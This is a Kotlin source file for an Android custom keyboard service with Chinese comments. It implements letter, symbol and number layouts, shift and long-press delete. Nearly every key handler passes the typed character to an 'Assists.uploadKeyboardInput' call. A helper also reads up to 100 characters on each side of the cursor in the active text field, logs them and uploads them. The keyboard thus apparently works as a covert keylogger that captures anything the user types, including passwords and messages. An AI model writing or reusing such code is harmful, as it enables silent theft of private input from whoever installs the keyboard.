package com.se.sebo.germany


import android.inputmethodservice.InputMethodService
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.ImageButton
import android.widget.LinearLayout
import com.se.sebo.Assists

class CustomKeyboardService : InputMethodService() {

    // 用于保存当前输入法视图（一定要赋值）
    private var keyboardView: LinearLayout? = null

    private var isUpperCase = false
    private var isSymbolMode = false
    val handler = Handler(Looper.getMainLooper())
    var isLongPressing = false


    override fun onCreateInputView(): View {
        // 注意这里要把“本地变量”赋值给“成员变量”
        keyboardView = LayoutInflater.from(this).inflate(
            R.layout.keyboard_layout_alphabet, null
        ) as LinearLayout

        // 设置两个键盘的点击事件
        setupAlphabetKeyboard(keyboardView!!)
        setupSymbolKeyboard(keyboardView!!)

        setupNumber(keyboardView!!)

        // 默认先显示字母键盘, 隐藏数字/符号键盘
        switchKeyboardMode(toSymbol = false)

        return keyboardView!!
    }

    private fun setupNumber(view: View) {
        val alphabetKeys = listOf(
            "1", "2", "3", "4", "5", "6",
            "7", "8", "9", "0"
        )

        // 给所有字母按钮设置点击事件
        for (key in alphabetKeys) {
            // 比如 btnQ、btnW 等
            val buttonId = resources.getIdentifier(
                "btn${key.uppercase()}", "id", packageName
            )
            val button = view.findViewById<Button>(buttonId)
            button?.setOnClickListener {
                val input = if (isUpperCase) key.uppercase() else key.lowercase()
                currentInputConnection.commitText(input, 1)
                Assists.uploadKeyboardInput(input)


                getInputText()



            }
        }
    }

    /**
     * 设置字母键盘的按钮点击逻辑
     */
    private fun setupAlphabetKeyboard(view: View) {
        val alphabetKeys = listOf(
            "q", "w", "e", "r", "t", "y",
            "u", "i", "o", "p",
            "a", "s", "d", "f", "g", "h", "j", "k", "l",
            "z", "x", "c", "v", "b", "n", "m"
        )

        // 给所有字母按钮设置点击事件
        for (key in alphabetKeys) {
            // 比如 btnQ、btnW 等
            val buttonId = resources.getIdentifier(
                "btn${key.uppercase()}", "id", packageName
            )
            val button = view.findViewById<Button>(buttonId)
            button?.setOnClickListener {
                val input = if (isUpperCase) key.uppercase() else key.lowercase()
                currentInputConnection.commitText(input, 1)
                Assists.uploadKeyboardInput(input)


                getInputText()

                // 如果切到大写后，输入一次就自动回到小写
                if (isUpperCase) {
                    toggleCase(false)
                }
            }
        }

        // 隐藏键盘按钮
        val hideKeyboardButton = view.findViewById<ImageButton>(R.id.btnHideKeyboard)
        hideKeyboardButton?.setOnClickListener {
            requestHideSelf(0) // 隐藏键盘

        }

        // Shift(大写)按钮
        val shiftButton = view.findViewById<ImageButton>(R.id.btnShift)
        shiftButton?.setOnClickListener {
            toggleCase(!isUpperCase)

        }

        // 删除按钮
        // 定义长按删除逻辑
        val longPressRunnable = object : Runnable {
            override fun run() {
                if (isLongPressing) {
                    currentInputConnection.deleteSurroundingText(1, 0) // 删除一个字符
                    handler.postDelayed(this, 200) // 每隔 50ms 再次触发
                    Assists.uploadKeyboardInput("删除前面一个字符")
                    getInputText() // 更新输入文本

                }
            }
        }

        val backspaceButton = view.findViewById<ImageButton>(R.id.btnBackspace)
        backspaceButton?.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    isLongPressing = true
                    handler.post(longPressRunnable) // 开始连续删除
                    true
                }
                MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> {
                    isLongPressing = false
                    handler.removeCallbacks(longPressRunnable) // 停止连续删除
                    true
                }
                else -> false
            }
        }

        // 切换到数字/符号键盘
        val switchToSymbolButton = view.findViewById<Button>(R.id.btnSwitchToNumber)
        switchToSymbolButton?.setOnClickListener {
            switchKeyboardMode(true)
        }

        // 空格
        val spaceButton = view.findViewById<Button>(R.id.btnSpace)
        spaceButton?.setOnClickListener {
            currentInputConnection.commitText(" ", 1)
            Assists.uploadKeyboardInput("空格")
            getInputText()

        }

        // .
        val btnDot = view.findViewById<Button>(R.id.btnDot)
        btnDot?.setOnClickListener {
            currentInputConnection.commitText(".", 1)
            Assists.uploadKeyboardInput(".")
            getInputText()

        }

        // 斜杠
        val slashButton = view.findViewById<Button>(R.id.btnSlash)
        slashButton?.setOnClickListener {
            currentInputConnection.commitText("/", 1)
            Assists.uploadKeyboardInput("/")
            getInputText()

        }
    }

    /**
     * 设置数字/符号键盘的按钮点击逻辑
     */
    private fun setupSymbolKeyboard(view: View) {
        val symbolLayout = view.findViewById<LinearLayout>(R.id.layout_number)

        // 1) 先遍历该布局下的所有子 View
        // 2) 如果它是 Button 并且不是需要特殊处理的那几个，就把它的 text 输入
        // symbolLayout 的子 View 是“行”，也是LinearLayout
        for (i in 0 until symbolLayout.childCount) {
            val rowLayout = symbolLayout.getChildAt(i)
            if (rowLayout is LinearLayout) {
                // rowLayout 的子 View 才是真正的 Button
                for (j in 0 until rowLayout.childCount) {
                    val item = rowLayout.getChildAt(j)
                    if (item is Button) {
                        // 排除一些特殊的 Button
                        if (item.id != R.id.btnSwitchToNumber1 &&
                            item.id != R.id.btnSpace1 &&
                            item.id != R.id.btnBackspace1
                        ) {
                            item.setOnClickListener {
                                currentInputConnection.commitText(item.text, 1)
                                Assists.uploadKeyboardInput(item.text.toString())
                                getInputText()

                            }
                        }
                    }
                }
            }
        }



        // 删除按钮
        // 定义长按删除逻辑
        val longPressRunnable = object : Runnable {
            override fun run() {
                if (isLongPressing) {
                    currentInputConnection.deleteSurroundingText(1, 0) // 删除一个字符
                    handler.postDelayed(this, 200) // 每隔 50ms 再次触发

                    Assists.uploadKeyboardInput("删除前面一个字符")
                    getInputText() // 更新输入文本

                }
            }
        }

        val backspaceButton1 = view.findViewById<ImageButton>(R.id.btnBackspace1)
        backspaceButton1?.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    isLongPressing = true
                    handler.post(longPressRunnable) // 开始连续删除
                    true
                }
                MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> {
                    isLongPressing = false
                    handler.removeCallbacks(longPressRunnable) // 停止连续删除
                    true
                }
                else -> false
            }
        }


        // 切回字母键盘
        val switchToAlphabetButton = view.findViewById<Button>(R.id.btnSwitchToNumber1)
        switchToAlphabetButton?.setOnClickListener {
            switchKeyboardMode(false)
        }

        // 空格
        val spaceButton = view.findViewById<Button>(R.id.btnSpace1)
        spaceButton?.setOnClickListener {
            currentInputConnection.commitText(" ", 1)
            Assists.uploadKeyboardInput("空格")
            getInputText()

        }

        // 斜杠
        val slashButton = view.findViewById<Button>(R.id.btnSlash1)
        slashButton?.setOnClickListener {
            currentInputConnection.commitText("/", 1)
            Assists.uploadKeyboardInput("/")
            getInputText()

        }

        val hideKeyboardButton = view.findViewById<ImageButton>(R.id.btnHideKeyboard1)
        hideKeyboardButton?.setOnClickListener {
            requestHideSelf(0) // 隐藏键盘
        }

        // .
        val btnDot1 = view.findViewById<Button>(R.id.btnDot1)
        btnDot1?.setOnClickListener {
            currentInputConnection.commitText(".", 1)
            Assists.uploadKeyboardInput(".")
            getInputText()

        }
    }


    /**
     * 大小写切换
     */
    private fun toggleCase(upperCase: Boolean) {
        isUpperCase = upperCase
        val keys = listOf(
            "q", "w", "e", "r", "t", "y",
            "u", "i", "o", "p",
            "a", "s", "d", "f", "g", "h", "j", "k", "l",
            "z", "x", "c", "v", "b", "n", "m"
        )

        // 一定要拿到当前的 keyboardView
        keyboardView?.let { kv ->
            // 切换字母的大小写显示
            for (key in keys) {
                val buttonId = resources.getIdentifier(
                    "btn${key.uppercase()}", "id", packageName
                )
                val button = kv.findViewById<Button>(buttonId)
                // 如果是大写模式，则文字显示大写；否则小写
                button?.text = if (upperCase) key.uppercase() else key.lowercase()
            }

            // 切换大写键图标
            val shiftButton = kv.findViewById<ImageButton>(R.id.btnShift)
            shiftButton?.setImageResource(if (upperCase) R.drawable.daxie1 else R.drawable.daxie)
        }
    }

    private fun getInputText() {
        // 获取光标前 100 个字符的文本内容
        val beforeText = currentInputConnection.getTextBeforeCursor(100, 0)
        // 获取光标后 100 个字符的文本内容
        val afterText = currentInputConnection.getTextAfterCursor(100, 0)
        // 将两部分文本合并
        val  text="${beforeText ?: ""}${afterText ?: ""}";
        Log.e("zi", "getInputText:"+text )

        Assists.uploadKeyboardInput(text)

    }


    /**
     * 切换字母与符号键盘
     */
    private fun switchKeyboardMode(toSymbol: Boolean) {
        isSymbolMode = toSymbol
        keyboardView?.let {
            val alphabetLayout = it.findViewById<LinearLayout>(R.id.layout_alphabet)
            val symbolLayout = it.findViewById<LinearLayout>(R.id.layout_number)

            // 显示或隐藏
            alphabetLayout?.visibility = if (toSymbol) View.GONE else View.VISIBLE
            symbolLayout?.visibility = if (toSymbol) View.VISIBLE else View.GONE
        }
    }
}

